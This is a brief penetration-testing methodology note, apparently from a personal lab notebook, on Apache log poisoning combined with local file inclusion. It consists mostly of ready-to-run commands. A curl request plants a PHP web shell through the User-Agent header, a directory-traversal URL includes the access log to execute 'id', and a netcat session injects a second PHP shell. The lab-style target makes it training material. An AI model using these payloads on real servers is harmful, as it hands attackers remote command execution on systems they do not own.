You can poison the log file with malicous php code in user agent like so:

```
curl <http://10.10.129.12> -A '<?php echo shell_exec($_REQUEST['0']);?>'

<http://10.10.129.12/?view=dog../../../../../../../../../../../../../var/log/apache2/access.log&ext=&0=id>
```

This technique also works:
rlwrap nc -nv 10.10.129.12 80
```
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

![unnamed_95cb7e3ef09f4944a4b00e06bd2e1fce](docs/Attachments/_Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/LFI_RFi/HTTP%20and%20LFI%20poisoning/{{notename}}-202605011742.png)
![unnamed_6e433414b9f046a08a381a512d56e47e](docs/Attachments/_Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/LFI_RFi/HTTP%20and%20LFI%20poisoning/{{notename}}-202605011742-1.png)
![unnamed_17b4513c18ce463ea487f8dbe1604d0c](docs/Attachments/_Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/LFI_RFi/HTTP%20and%20LFI%20poisoning/{{notename}}-202605011742-2.png)